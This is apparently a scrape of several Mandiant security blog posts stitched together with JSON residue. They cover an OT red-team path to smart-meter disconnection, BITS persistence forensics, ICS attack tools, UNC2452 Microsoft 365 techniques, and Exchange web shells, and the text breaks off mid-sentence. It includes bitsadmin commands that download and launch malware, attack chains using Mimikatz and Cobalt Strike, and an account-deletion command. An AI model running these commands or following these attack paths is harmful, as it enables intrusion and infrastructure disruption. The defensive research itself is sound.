Propagation Targeted OT attacks attempting to cause physical impacts require planning. A sophisticated actor who is motivated to disrupt or modify an industrial process from a public network will necessarily need to maintain access to the victim environment and remain undetected for enough time to accomplish their objective. Throughout this time, the actor will strive to learn about the control process to formulate the attack, figure out how to pivot to the OT systems and bypass security controls, and sometimes even develop or deploy custom OT malware. Similar to the techniques used by TEMP.Veles to reach the OT network during the TRITON incident , Mandiant’s experience during red team engagements highlights that collecting information from IT network assets plays a crucial role in targeted OT attacks. As a result, the internal reconnaissance phase for OT targeted attacks begins in the enterprise network, where the actor obtains knowledge and resources to propagate from an initial compromise in the IT network to remote access in the OT network. Detailed information collected about the target, their security operations, and their environment can also support an actor's attempts at remaining undetected while expanding operations. Figure 1: Targeted OT attack from a public network Thinking Like an Adversary: How to Turn Off Smart Energy Meters The ideal scenario for an attacker targeting OT systems is to achieve their objective while remaining undetected. Mandiant’s Red Team works with clients across critical infrastructure industries to simulate attack scenarios in which actors can accomplish this goal by gaining access to OT systems via compromise of external facing IT networks. During these engagements, we emulate real actor behaviors to learn about our target and to determine the best paths for IT/OT network propagation. For this engagement, we simulated an end-to-end OT-specific attack scenario in which we tested the security controls and response capabilities of an organization to protect smart grid meter control infrastructure from an external attacker. Mandiant leveraged weaknesses in people, process, and technology to gain remote access from the public Internet and to achieve a set of pre-approved objectives in the OT environment. Establishing a Foothold in the IT Network Mandiant conducted a spear phishing exercise to gain initial access into the client’s enterprise network from the Internet. We defined a combination of two different phishing scenarios that we deployed to test email filtering and egress monitoring controls: Embedded link for a malicious file hosted on a Mandiant owned domain on the Internet Email attachment for a Microsoft Office document with auto - executable macro code This exercise allowed our team to achieve code execution on a user workstation in the enterprise environment and to establish an unattributable egress communication path to a Mandiant hosted Cobalt Strike Command and Control (C&C) server on the Internet. After establishing a stable communication path with workstations in the enterprise environment, we utilized the following publicly available offensive security tools (OST) to escalate privileges and to obtain domain administrator level access: ldapsearch to enumerate information in the enterprise domain PowerSploit to exploit common security misconfigurations in IT WMImplant to move laterally from one system to another in the internal network Mimikatz to extract credentials for local user and domain administrator accounts As domain administrators, we gained unrestricted access to a variety of resources connected to the enterprise domain (e.g. server resources, file shares, IT applications, and administrator consoles for IT systems). During the initial stages of our engagement, our actions were in no way different to other less sophisticated intrusions on industrial organizations, such as financially-motivated compromises. Defining Our Path to the OT Network Similar to real world threat actors carrying out targeted OT attacks, Mandiant’s OT Red Team dedicates significant effort for internal reconnaissance in the IT network to develop a logical mapping of the extended network architecture and discover targets of interest (people, processes, or technology). The information we acquire helps us to (a) define paths to propagate from the IT to the OT network and (b) achieve our final objective in the OT network without raising alarms. During OT Red Team engagements across different industries, we follow a real attacker’s cost-benefit analysis to determine which sources or methods are most likely to help us obtain that information. Figure 2: Information sources and target information from enterprise networks For this engagement, we leveraged the domain administrator credentials obtained in the previous phase to gain access to Microsoft System Center Configuration Manager (SCCM) in the IT network. Logged into the SCCM console, we leveraged software deployment features for collection to establish C&C over user workstations belonging to pre-selected departments in the client organization. Mandiant chose the specific groups based on the names of their departments and the description attributes, which suggested a high likelihood of member users with high privilege access for network infrastructure or application management. This included members of the following groups: network management, firewall administration, control engineering, and smart meter operations. Access to user workstations of target employees in these departments enabled us to: Capture keystrokes to obtain remote desktop protocol (RDP) credentials for the OT network by using a Cobalt Strike modified script Login to department file shares and extract OT system design documents Extract network design documents and backup files for OT firewall configurations found in the firewall management console Find plaintext credentials for OT management systems from operation manuals Internal reconnaissance in the IT network not only allowed us to obtain remote access credentials for the OT network, but to also gain a deeper understanding of the business processes and technical control system operations in the OT environment by reviewing internal OT-specific operational procedures and security documentation such as asset inventories and configurations. Propagating to the OT Network During the process of propagation from IT to OT networks, an actor will leverage previously compromised systems, credentials, or applications to access systems in higher security zones—such as OT demilitarized zones (DMZ). Based on our observations during multiple red teaming engagements and research, the most likely attack vectors for propagation are: Table 1: Most likely attack vectors for IT/OT propagation For this engagement, we initially analyzed the system architecture to define the best path to follow. Engineers from the target organization were required to use multi-factor-authentication (MFA) to gain remote access to jumpbox servers in the OT network. While not impossible, bypassing this setup would require more time and resources. We instead decided to search for other plausible attack propagation paths. Figure 3: Formal communication path from enterprise to OT network Reviewing the firewall configuration files, we identified a dedicated communication path for management access to a Microsoft Windows patch management server in a DMZ between the IT network and the OT network. This patch management server was running on a virtual machine in the DMZ network, while the administration console for the underlying hypervisor software itself was hosted in the IT network. Mandiant logged into the administration console for the hypervisor software using IT network domain administrator credentials. We then leveraged guest machine administration features via direct console access to execute commands on the patch management server in the DMZ network. The compromise of the patch management server in the DMZ allowed us to pivot via SMB connections to Microsoft Windows-based intermediary systems in the OT network. Figure 4: Remote attack propagation path from IT network to OT network Lastly, we compromised Microsoft Windows server systems in the OT network to complete the objectives of the exercise. Using OT credentials retrieved in the previous phases, we authenticated to the SMB service (using single factor authentication) by pivoting through the patch management server in the DMZ network. This enabled us to execute remote console commands on management servers (such as the domain controller) in the OT network. With access to the domain controller in the core OT network, we extracted credentials for high privilege domain administrator accounts in the OT network using DCSYNC and Mimikatz. Using these accounts, we gained control of management servers, application servers, and operator workstations in the OT network. Mandiant was also able to use compromised credentials to login to the human machine interface (HMI) portal for the meter control infrastructure and issue a disconnect command for a target endpoint meter in the smart grid environment. Strategic Collection and Detection Opportunities During Reconnaissance and Network Propagation Although specific capabilities such as malware and tooling vary amongst incidents, internal reconnaissance and network propagation are consistently needed for sophisticated adversaries to expand remote operations from external networks to OT systems. Focusing collection, detection, and hunting efforts on assets or information that are likely to be compromised during these phases presents defenders with strategic opportunities to hunt for and detect targeted adversary activity before it poses a risk to control systems. In a previous blog post stating our approach to OT security, we highlighted that IT networks close to production networks and OT intermediary systems remain the best zones to detect OT targeted attacks, a.k.a. “ The Funnel of Opportunity ”. As actors pivot across systems and networks to gather information and elevate privileges, they leave footprints that can be tracked before they propagate to critical systems. An actor who covertly performs internal reconnaissance and propagates to the OT network is already positioned to cause damage on mission critical assets and is unlikely to be discovered. Early detection of adversary activity before reaching critical OT systems will decrease the dwell time and the risk of an incident. OT defenders can prioritize collection and detection, alert triage, and incident response efforts by becoming familiar with the types of information and services that OT focused threat actors commonly search for during internal reconnaissance in IT networks and network propagation across OT intermediary systems. Understanding where this information resides presents defenders with a catalog of systems and networks to focus collection and detection efforts on. Defenders can create tailored detections to hunt for adversary activity pursuing this information, prioritize alert response efforts, and identify additional security controls to implement. Mandiant red teaming in OT can help organizations identify which data is valuable for attackers to support their network propagation efforts and which systems are most likely to be compromised by attackers targeting OT networks.

                "text": "We are thrilled to launch M-Trends 2021 , the 12 th edition of our annual FireEye Mandiant publication. The past year has been unique, as we witnessed an unprecedented combination of global events. Business operations shifted in response to the worldwide pandemic and threat actors continued to escalate the sophistication and aggressiveness of their attacks, while in parallel leveraged unexpected global events to their advantage. We discuss all of this and much more in the full report, which is available for download today . But first, here is a sneak preview of the most popular M-Trends metric where we answer the critical question: Are organizations getting better at detecting attacks? In short, yes! Back in 2011, we reported a 416-day global median dwell time, indicating that attackers were operating undetected on a system or network for over a year on average. This time, from Oct. 1, 2019 through Sept. 30, 2020, the median dwell time has decreased to only 24 days. This means—for the first time in M-Trends history—the median dwell time has dropped to under one month. Although this drop in dwell time is promising, it is critical for organizations to remember that cyber adversaries typically only need a few days to achieve their objective, such as identifying and stealing the crown jewels of a victim organization or launching a crippling ransomware attack. Organizations across the globe must remain vigilant, to prepare for the next incident. There is much more to unpack in the M-Trends 2021 report. Here is a quick rundown of what to expect: By the Numbers : A large and diverse set of metrics including attacker dwell time, detection by source, industry targeting, growing threat techniques, sophisticated malware families, and more. Ransomware : Front-line stories on how this harmful threat is evolving, challenges with recovery, and best practice hardening strategies to effectively combat this threat. Newly Named Threat Groups : More on FIN11, a financially motivated threat group that we promoted in 2020, which has been active since at least 2016 and is most recently known for operations involving ransomware and extortion. Pandemic-Related Threats : Breakdown of countless espionage campaigns targeting ground-breaking research in the race to learn more about COVID-19. UNC2452/SUNBURST : UNC2452’s headline-making compromise of environments via an implant in the SolarWinds Orion platform, mapped to the attack lifecycle framework with details at every stage. Case Studies : Mandiant engagements involving the rise of insider threats and how to be more prepared, plus advanced red teaming tactics that enabled access to executive emails without any exploits. For over a decade, the mission of M-Trends has always been the same: to arm security professionals with insights on the latest attacker activity as seen directly on the front lines, backed by actionable learnings to improve organizations’ security postures within an evolving threat landscape. Download the M-Trends 2021 report today, and then for more information, check out the FireEye Mandiant Virtual Summit . Starting today and running through April 15, the event includes a variety of sessions, with three related to M-Trends : one that provides an overview of the report and highlights key topics , another focused on our “By the Numbers” chapter coupled with mitigation solutions related to these metrics, and one covering the report through a lens from the EMEA region .

                "text": "In this blog post we will describe: How attackers use the Background Intelligent Transfer Service (BITS) Forensic techniques for detecting attacker activity with data format specifications Public release of the BitsParser tool A real-world example of malware using BITS persistence Introduction Microsoft introduced the Background Intelligent Transfer Service (BITS) with Windows XP to simplify and coordinate downloading and uploading large files. Applications and system components, most notably Windows Update, use BITS to deliver operating system and application updates so they can be downloaded with minimal user disruption. Applications interact with the Background Intelligent Transfer Service by creating jobs with one or more files to download or upload. The BITS service runs in a service host process and can schedule transfers to occur at any time. Job, file, and state information is stored in a local database. How Attackers Use BITS As is the case with many technologies, BITS can be used both by legitimate applications and by attackers. When malicious applications create BITS jobs, files are downloaded or uploaded in the context of the service host process. This can be useful for evading firewalls that may block malicious or unknown processes, and it helps to obscure which application requested the transfer. BITS transfers can also be scheduled allowing them to occur at specific times without relying on long-running processes or the task scheduler. BITS transfers are asynchronous, which can result in situations where the application that created a job may not be running when the requested transfers complete. To address this scenario BITS jobs can be created with a user-specified notification command, which will be executed after the job completes or in case of errors. The notification commands associated with BITS jobs can specify any executable or command to run. Attackers have utilized this feature as a method for maintaining persistence of malicious applications. Since the command data for BITS jobs is stored to a database rather than traditional registry locations, it can be overlooked by tools that attempt to identify persistence executables and commands or by forensic investigators. BITS jobs can be created using API function calls or via the bitsadmin command line tool. See Figure 1 and Figure 2 for an example of how a BITS job can be used to download a file and trigger execution. > bitsadmin /create download > bitsadmin /addfile download https://<site>/malware.exe c:\\windows\\malware.exe > bitsadmin /resume download > bitsadmin /complete download Created job {EA8603EB-7CC2-44EC-B1EE-E9923290C2ED}. Added https://<site>/malware.exe -> c:\\windows\\malware.exe to job. Job resumed. Job completed. Figure 1: Using bitsadmin to create a job that downloads a malicious executable and stores it to c:\\windows\\malware.exe. > bitsadmin /create persistence > bitsadmin /addfile persistence http://127.0.0.1/invalid.exe c:\\windows\\i.exe > bitsadmin /SetNotifyCmdLine persistence c:\\windows\\malware.exe NULL > bitsadmin /resume persistence Figure 2: Using bitsadmin to create a job that will launch malware.exe after attempting to download an invalid URL. Creating BitsParser Through our investigations, Mandiant consultants identified evidence of attackers leveraging BITS across multiple campaigns. In order to search for evidence of attacker use of BITS, we needed to understand the underlying infrastructure used by BITS and create a tool that could collect relevant information. We created BitsParser , which parses BITS databases and returns information about jobs executed on endpoint systems. The tool can be run internally by Mandiant consultants via our endpoint agent allowing BITS data to be acquired from many hosts across an enterprise. BitsParser has been successfully used in many investigations to uncover attacker downloads, uploads, and persistence. In order to process the custom database format, BitsParser utilizes the open source ANSSI-FR library. The library allows parsing of both active and deleted entries from BITS database files, and it can fully extract relevant information from job and file records. The QMGR Database BITS jobs and associated state information are stored in local “queue manager” (QMGR) database files in the %ALLUSERSPROFILE%\\Microsoft\\Network\\Downloader directory. The database is stored to files named qmgr0.dat and qmgr1.dat. The two-file scheme appears to be used for back up and synchronization purposes. The second file largely contains duplicate job and file information, though some unique or older entries can be found in the file. Windows 10 Changes The Background Intelligent Transfer Service has largely remained unchanged since its introduction. However, Windows 10 introduced significant changes to the service, including an all new database format. On Windows 10 the QMGR database is stored using the Extensible Storage Engine (ESE) format. ESE databases have been used in many other Microsoft products including Exchange, Active Directory, and Internet Explorer. Windows 10 stores the QMGR database in a single file called qmgr.db . Separate transaction log files are maintained in the same directory. The most recent transaction log is stored to a file called edb.log , and three older transaction logs with numerical suffixes are typically present. Parsing ESE Databases In order to support investigations on Windows 10 systems, we updated the BitsParser tool to support the new QMGR database format. To accomplish this, we needed a Python-based ESE database parser. Research led us to libesedb , which is a full ESE database implementation written in C with a Python wrapper. With no other Python options available, we initially used libesedb in BitsParser to parse the Windows 10 QMGR database. However, we sought a solution that did not rely on native executables and would be more compact for improved efficiency in large scale deployments. The only pure Python ESE database implementation we identified was part of the Impacket network toolset. Although the source code could perform basic database enumeration, it lacked key features, including the ability to process long values. Since the QMGR database includes entries large enough to require long values, modification of the Impacket implementation was required. We adapted the Impacket ESE database parsing code to make it more robust and support all features necessary for parsing QMGR databases. The full Python solution allows database parsing in a much smaller package without the risks and limitations of native code. Database Structure The Windows 10 QMGR database contains two tables: Jobs and Files. Both tables have two columns: Id and Blob. The Id contains a GUID to identify the entry, and the Blob contains binary data which defines the job or file. Fortunately, the job and file structures are largely unchanged from the previous database format. Job data starts with the control structure: Offset Field Size 0 Type 4 4 Priority 4 8 State 4 ... 16 Job ID (GUID) 16 32 Name (UTF-16) variable variable Description (UTF-16) variable variable Command (UTF-16) variable variable Arguments (UTF-16) variable variable User SID (UTF-16) variable variable Flags 4 Following the control structure is a list of files delimited by the XFER GUID, {7756DA36-516F-435A-ACAC-44A248FFF34D}. The list begins with a 4-byte file count followed by a list of GUIDs, which correspond to Id values in the Files table. The file data uses the following structure: Field Size Destination Filename (UTF-16) variable Source Filename (UTF-16) variable Temporary Filename (UTF-16) variable Download Size 8 Transfer Size 8 unknown 1 Drive (UTF-16) variable Volume GUID (UTF-16) variable The database is processed by enumerating entries in the Jobs table, parsing each job data, finding correlated files, and parsing the corresponding records in the Files table. This allows the BitsParser to combine related information and output jobs with their associated files including relevant metadata. Recovering Deleted Records Active jobs have entries in the Jobs and Files tables. Records are deleted upon job completion or cancellation. As with other filesystem and data formats, deleted entries are not immediately overwritten and can often be recovered for some time after deletion. The following algorithm is used to recover deleted jobs and files from Windows 10 QMGR databases: Locate file records by searching for the file identifier GUID, {519ECFE4-D946-4397-B73E-268513051AB2}. Attempt to parse the following data as a normal file record. Locate job records by searching for job identifier GUIDs. Attempt to parse the following data as a normal job record. Handle incomplete job entries by parsing just the control structure and manually locate associated files if required. The following job GUIDs have been observed in QMGR databases: {E10956A1-AF43-42C9-92E6-6F9856EBA7F6} {4CD4959F-7064-4BF2-84D7-476A7E62699F} {A92619F1-0332-4CBF-9427-898818958831} {DDBC33C1-5AFB-4DAF-B8A1-2268B39D01AD} {8F5657D0-012C-4E3E-AD2C-F4A5D7656FAF} {94416750-0357-461D-A4CC-5DD9990706E4} Correlate carved file records to carved jobs. Process all remaining carved file records that could not be correlated to active or deleted jobs. Historic records can also be found in transaction log files. Although we do not parse the transaction log structures, the same algorithm can be used to find job and file records within the logs by searching for appropriate GUIDs. While the same records may be present in multiple files, duplicates can be suppressed to prevent output of redundant information. BitsParser Tool Release At the time of writing we are not aware of any open source tools available to parse BITS databases and extract data useful for incident response and forensic investigations. To help address this and foster further research, FireEye has decided to release a standalone version of BitsParser. This command line utility can process all versions of BITS databases and perform carving to recover deleted job and file information. Source code for BitsParser can be found at our GitHub page . Note that on Windows 10 the QMGR database files are opened without sharing by the BITS service thus preventing other programs from directly opening them. When BitsParser is deployed via the FireEye endpoint agent it can directly parse the local filesystem and raw read files in circumstances where they cannot be directly read. The standalone BitsParser does not have this ability. The BITS service should be stopped prior to running BitsParser or third-party tools for copying locked files may be utilized. BITS Persistence in the Wild In 2020 Mandiant responded to many incidents involving Ryuk ransomware operators leveraging custom backdoors and loaders to actively target hospitals and other medical support centers (see our blog post Unhappy Hour Special: KEGTAP and SINGLEMALT With a Ransomware Chaser ). Through numerous engagements Mandiant was able to profile the attacker's Tools Techniques and Procedures (TTPs) and identify unique aspects of the various backdoors and loaders that were leveraged prior to encryption. In one such engagement, Mandiant consultants had mapped the vast majority of the attack timeline from initial exploitation to the encryption of corporate resources and an extortion demand. Log analysis and telemetry provided by the customer's on-premises endpoint detection solution led to the identification of a KEGTAP backdoor on an end-user workstation. Mandiant was able to identify the specific email and lure used by the ransomware operators including the download and execution of the file mail.exe , which launched KEGTAP. However, none of the persistence mechanisms that Mandiant observed in other engagements were present on this endpoint. A full understanding of the persistence mechanism would allow Mandiant to hunt for additional evidence of attacker activity across the environment and in other engagements. As focus intensified, Mandiant consultants identified evidence to indicate that the BITS service launched the KEGTAP backdoor. Analysts identified entries in the Microsoft-Windows-Bits-Client operational event log which associated the BITS service activity with the file mail.exe . 3 | Information | The BITS service created a new job: System update, with owner REDACTED 61 | Warning | BITS stopped transferring the System update transfer job that is associated with the http://127.0.0.1/tst/56/ URL. The status code is 2147954429. 64 | Warning | The BITS job System update is configured to launch C:\\Users\\REDACTED\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\REDACTED\\mail.exe after transfer of http://127.0.0.1/tst/12/. The service failed to launch the program with error 2147942402, BITS will continue trying to launch the program periodically until it succeeds. Figure 3: Event log entries showing the creation of a BITS job for persistence Mandiant consultants were able to confirm the details of the BITS job by interacting with the host and examining the QMGR database. The malicious BITS job was set to attempt an HTTP transfer of a nonexistent file from the local host. As this file would never exist, BITS would trigger the error state and launch the notify command, which in this case was KEGTAP. Unfortunately, while this was successful in identifying a previously unknown persistence mechanism associated with this threat group, manual QMGR database analysis would not scale across multiple systems or environments. Adapting the existing BitsParser to parse the Windows 10 version of the QMGR database enabled Mandiant consultants to efficiently identify additional infected systems across multiple environments. { \"JobType\": \"download\", \"JobPriority\": \"normal\", \"JobState\": \"queued\", \"JobName\": \"System update\", \"CommandExecuted\": \"C:\\\\Users\\\\REDACTED\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\IE\\\\REDACTED\\\\mail.exe\", \"Files\": [ { \"DestFile\": \"C:\\\\Users\\\\REDACTED\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\IE\\\\REDACTED\\\\mail.exe\", \"SourceURL\": \"http://127.0.0.1/tst/56/\", \"DownloadByteSize\": 0 } ] } Figure 4: BitsParser output shows the malicious BITS job launching mail.exe Conclusion The Background Intelligent Transfer Service continues to provide utility to applications and attackers alike. The BITS QMGR database can present a useful source of data in an investigation or hunting operation. BitsParser may be utilized with other forensic tools to develop a detailed view of attacker activity. Subscribe to Blogs Get email updates as new blog posts are added."

                "text": "There has only been a small number of broadly documented cyber attacks targeting operational technologies (OT) / industrial control systems (ICS) over the last decade. While fewer attacks is clearly a good thing, the lack of an adequate sample size to determine risk thresholds can make it difficult for defenders to understand the threat environment, prioritize security efforts, and justify resource allocation. To address this problem, FireEye Mandiant Threat Intelligence produces a range of reports for subscription customers that focus on different indicators to predict future threats. Insights from activity on dark web forums, anecdotes from the field, ICS vulnerability research, and proof of concept research makes it possible to illustrate the threat landscape even with limited incident data. This blog post focuses on one of those source sets—ICS-oriented intrusion and attack tools, which will be referred to together in this post as cyber operation tools. ICS-oriented cyber operation tools refer to hardware and software that has the capability to either exploit weaknesses in ICS, or interact with the equipment in such a way that could be utilized by threat actors to support intrusions or attacks. For this blog post, we separated exploit modules that are developed to run on top of frameworks such as Metasploit , Core Impact , or Immunity Canvas from other cyber operation tools due to their exceedingly high number. Cyber Operation Tools Reduce the Level of Specialized Knowledge Attackers Need to Target ICS As ICS are a distinct sub-domain to information and computer technology, successful intrusions and attacks against these systems often requires specialized knowledge, establishing a higher threshold for successful attacks. Since intrusion and attack tools are often developed by someone who already has the expertise, these tools can help threat actors bypass the need for gaining some of this expertise themselves, or it can help them gain the requisite knowledge more quickly. Alternatively, experienced actors may resort to using known tools and exploits to conceal their identity or maximize their budget. Figure 1: ICS attacker knowledge curve The development and subsequent adoption of standardized cyber operation tools is a general indication of increasing adversarial capability. Whether these tools were developed by researchers as proof-of-concept or utilized during past incidents, access to them lowers the barrier for a variety of actors to learn and develop future skills or custom attack frameworks. Following this premise, equipment that is vulnerable to exploits using known cyber operation tools becomes low-hanging fruit for all sorts of attackers. ICS Cyber Operation Tool Classification Mandiant Intelligence tracks a large number of publicly available ICS-specific cyber operation tools. The term \"ICS-specific,\" as we employ it, does not have a hard-edged definition. While the vast majority of cyber operation tools we track are clear-cut cases, we have, in some instances, considered the intent of the tool's creator(s) and the tool's reasonably foreseeable impact on ICS software and equipment. Note, we excluded tools that are IT-based but may affect OT systems, such as commodity malware or known network utilities.  We included only a few exceptions, where we identified specialized adaptations or features that enabled the tool to interact with ICS, such as the case of nmap scripts. We assigned each tool to at least one of eight different categories or classes, based on functionality. Table 1: Classes of ICS-specific intrusion and attack tools While some of the tools included in our list were created as early as 2004, most of the development has taken place during the last 10 years. The majority of the tools are also vendor agnostic, or developed to target products from some of the largest ICS original equipment manufacturers (OEM). Siemens stands out in this area, with 60 percent of the vendor-specific tools potentially targeting its products. Other tools we identified were developed to target products from Schneider Electric, GE, ABB, Digi International, Rockwell Automation, and Wind River Systems. Figure 2 depicts the number of tools by class. Of note, network discovery tools make up more than a quarter of the tools. We also highlight that in some cases, the software exploitation tools we track host extended repositories of modules to target specific products or vulnerabilities. Figure 2: ICS-specific intrusion and attack tools by class Software Exploit Modules Software exploit modules are the most numerous subcomponents of cyber operation tools given their overall simplicity and accessibility. Most frequently, exploit modules are developed to take advantage of a specific vulnerability and automate the exploitation process. The module is then added to an exploit framework. The framework works as a repository that may contain hundreds of modules for targeting a wide variety of vulnerabilities, networks, and devices. The most popular frameworks include Metasploit , Core Impact , and Immunity Canvas . Also, since 2017, we have identified the development of younger ICS-specific exploit frameworks such as Autosploit , Industrial Exploitation Framework (ICSSPLOIT), and the Industrial Security Exploitation Framework . Given the simplicity and accessibility of exploit modules, they are attractive to actors with a variety of skill levels. Even less sophisticated actors may take advantage of an exploit module without completely understanding how a vulnerability works or knowing each of the commands required to exploit it. We note that, although most of the exploit modules we track were likely developed for research and penetration testing, they could also be utilized throughout the attack lifecycle. Exploit Modules Statistics Since 2010, Mandiant Intelligence has tracked exploit modules for the three major exploitation frameworks: Metasploit , Core Impact , and Immunity Canvas . We currently track hundreds of ICS-specific exploit modules related to more than 500 total vulnerabilities, 71 percent of them being potential zero-days. The break down is depicted in Figure 3. Immunity Canvas currently has the most exploits due in large part to the efforts of Russian security research firm GLEG . Figure 3: ICS exploit modules by framework Metasploit framework exploit modules deserve particular attention. Even though it has the fewest number of modules, Metasploit is freely available and broadly used for IT penetration testing, while Core Impact and Immunity Canvas are both commercial tools. This makes Metasploit the most accessible of the three frameworks. However, it means that module development and maintenance are provided by the community, which is likely contributing to the lower number of modules. It is also worthwhile to examine the number of exploit modules by ICS product vendor. The results of this analysis are depicted in Figure 4, which displays vendors with the highest number of exploit modules (over 10). Figure 4: Vendors with 10 exploit modules or more Figure 4 does not necessarily indicate which vendors are the most targeted, but which products have received the most attention from exploit writers. Several factors could contribute to this, including the availability of software to experiment with, general ease of writing an exploit on particular vulnerabilities, or how the vulnerability matches against the expertise of the exploit writers. Some of the vendors included in the graph have been acquired by other companies, however we tracked them separately as the vulnerability was identified prior to the acquisition. One example of this is Schneider Electric, which acquired 7-Technologies in 2011 and altered the names of their product portfolio. We also highlight that the graph solely counts exploit modules, regardless of the vulnerability exploited. Modules from separate frameworks could target the same vulnerability and would each be counted separately. ICS Cyber Operation Tools and Software Exploitation Frameworks Bridge Knowledge and Expertise Gaps ICS-specific cyber operation tools often released by researchers and security practitioners are useful assets to help organizations learn about ongoing threats and product vulnerabilities. However, as anything publicly available, they can also lower the bar for threat actors that hold an interest in targeting OT networks. Although successful attacks against OT environments will normally require a high level of skills and expertise from threat actors, the tools and exploit modules discussed in this post are making it easier to bridge the knowledge gap. Awareness about the proliferation of ICS cyber operation tools should serve as an important risk indicator of the evolving threat landscape. These tools provide defenders with an opportunity to perform risk assessments in test environments and to leverage aggregated data to communicate and obtain support from company executives. Organizations that do not pay attention to available ICS cyber operation tools risk becoming low-hanging fruit for both sophisticated and unexperienced threat actors exploring new capabilities.

                "text": "UPDATE (Mar. 18): Mandiant recently observed targeted threat actors modifying mailbox folder permissions of user mailboxes to maintain persistent access to the targeted users' email messages. This stealthy technique is not usually monitored by defenders and provides threat actors a way to access the desired email messages using any compromised credentials. The white paper, blog post and Azure AD Investigator tool have been updated to reflect these findings. Mandiant would like to thank the members of Microsoft’s Detection and Response Team (DART) for their collaboration on this research. In December 2020, FireEye uncovered and publicly disclosed a widespread attacker campaign that is being tracked as UNC2452 . In some, but not all, of the intrusions associated with this campaign where Mandiant has visibility, the attacker used their access to on-premises networks to gain unauthorized access to the victim’s Microsoft 365 environment. Goals and Objectives Methodologies that UNC2452 and other threat actors have used to move laterally from on-premises networks to the Microsoft 365 cloud have been detailed in our white paper, Remediation and Hardening Strategies for Microsoft 365 to Defend Against UNC2452 . The paper also discusses how organizations can proactively harden their environments and remediate environments where similar techniques have been observed. Mandiant is releasing an auditing script, Azure AD Investigator , through its GitHub repository that organizations can use to check their Microsoft 365 tenants for indicators of some of the techniques used by UNC2452. The script will alert administrators and security practitioners to artifacts that may require further review to determine if they are truly malicious or part of legitimate activity. Many of the attacker techniques detailed in the white paper are dual-use in nature—they can be used by threat actors but also by legitimate tools. Therefore, a detailed review for specific configuration parameters may be warranted, including correlating and verifying that configurations are aligned with authorized and expected activities. Attacker Tactics, Techniques and Procedures (TTPs) Mandiant has observed UNC2452 and other threat actors moving laterally to the Microsoft 365 cloud using a combination of four primary techniques: Steal the Active Directory Federation Services (AD FS) token-signing certificate and use it to forge tokens for arbitrary users (sometimes described as Golden SAML ). This would allow the attacker to authenticate into a federated resource provider (such as Microsoft 365) as any user, without the need for that user’s password or their corresponding multi-factor authentication (MFA) mechanism. Modify or add trusted domains in Azure AD to add a new federated Identity Provider (IdP) that the attacker controls. This would allow the attacker to forge tokens for arbitrary users and has been described as an Azure AD backdoor . Compromise the credentials of on-premises user accounts that are synchronized to Microsoft 365 that have high privileged directory roles, such as Global Administrator or Application Administrator. Backdoor an existing Microsoft 365 application by adding a new application or service principal credential in order to use the legitimate permissions assigned to the application, such as the ability to read email, send email as an arbitrary user, access user calendars, etc. Modify the permissions of folders in a victim mailbox (such as the inbox) to make its contents readable by any other user in the victim’s Microsoft 365 environment.

                "text": "Beginning in January 2021, Mandiant Managed Defense observed multiple instances of abuse of Microsoft Exchange Server within at least one client environment. The observed activity included creation of web shells for persistent access, remote code execution, and reconnaissance for endpoint security solutions. Our investigation revealed that the files created on the Exchange servers were owned by the user NT AUTHORITY\\SYSTEM , a privileged local account on the Windows operating system. Furthermore, the process that created the web shell was UMWorkerProcess.exe , the process responsible for Exchange Server’s Unified Messaging Service. In subsequent investigations, we observed malicious files created by w3wp.exe , the process responsible for the Exchange Server web front-end. In response to this activity, we built threat hunting campaigns designed to identify additional Exchange Server abuse. We also utilized this data to build higher-fidelity detections of web server process chains. On March 2, 2021, Microsoft released a blog post that detailed multiple zero-day vulnerabilities used to attack on-premises versions of Microsoft Exchange Server. Microsoft also issued emergency Exchange Server updates for the following vulnerabilities: CVE Risk Rating Access Vector Exploitability Ease of Attack Mandiant Intel CVE-2021-26855 Critical Network Functional Easy Link CVE-2021-26857 Medium Network Functional Easy Link CVE-2021-26858 Medium Network Functional Easy Link CVE-2021-27065 Medium Network Functional Easy Link Table 1: List of March 2021 Microsoft Exchange CVEs and FireEye Intel Summaries The activity reported by Microsoft aligns with our observations. FireEye currently tracks this activity in three clusters, UNC2639, UNC2640, and UNC2643. We anticipate additional clusters as we respond to intrusions. We recommend following Microsoft’s guidance and patching Exchange Server immediately to mitigate this activity. Based on our telemetry, we have identified an array of affected victims including US-based retailers, local governments, a university, and an engineering firm. Related activity may also include a Southeast Asian government and Central Asian telecom. Microsoft reported the exploitation occurred together and is linked to a single group of actors tracked as “HAFNIUM”, a group that has previously targeted the US-based defense companies, law firms, infectious disease researchers, and think tanks. In this blog post, we will detail our observations on the active investigations we are currently performing. As our experience with and knowledge of this threat actor grows, we will update this post or release new technical details as appropriate. For our Managed Defense Customers, we have launched a Community Protection Event that will provide frequent updates on this threat actor and activity. We will be discussing these attacks more in an upcoming webinar on Mar. 17, 2021 . From Exploit to Web Shell Beginning in January 2021, Mandiant Managed Defense observed the creation of web shells on one Microsoft Exchange server file system within a customer’s environment. The web shell, named help.aspx (MD5: 4b3039cf227c611c45d2242d1228a121), contained code to identify the presence of (1) FireEye xAgent, (2) CarbonBlack, or (3) CrowdStrike Falcon endpoint products and write the output of discovery. Figure 1 provides a snippet of the web shell’s code. Figure 1: Snippet of the web shell help.aspx, crafted to identify the presence of endpoint security software on a victim system The web shell was written to the system by the UMWorkerProcess.exe process, which is associated with Microsoft Exchange Server’s Unified Messaging service. This activity suggested exploitation of CVE-2021-26858. Approximately twenty days later, the attacker placed another web shell on a separate Microsoft Exchange Server. This second, partially obfuscated web shell, named iisstart.aspx (MD5: 0fd9bffa49c76ee12e51e3b8ae0609ac), was more advanced and contained functions to interact with the file system. As seen in Figure 2, the web shell included the ability to run arbitrary commands and upload, delete, and view the contents of files. Figure 2: Snippet of iisstart.aspx, uploaded by the attacker in late January 2021 While the use of web shells is common amongst threat actors, the parent processes, timing, and victim(s) of these files clearly indicate activity that commenced with the abuse of Microsoft Exchange. In March 2021, in a separate environment, we observed a threat actor utilize one or more vulnerabilities to place at least one web shell on the vulnerable Exchange Server. This was likely to establish both persistence and secondary access, as in other environments. In this case, Mandiant observed the process w3wp.exe , (the IIS process associated with the Exchange web front-end) spawning cmd.exe to write a file to disk. The file, depicted in Figure 3, matches signatures for the tried-and-true China Chopper . Figure 3: Snippet of China Chopper web shell found on a compromised Exchange Server system We observed that in at least two cases, the threat actors subsequently issued the following command against the Exchange web server: net group \"Exchange Organization administrators\" administrator /del /domain. This command attempts to delete the administrator user from the Exchange Organizations administrators group, beginning with the Domain Controller 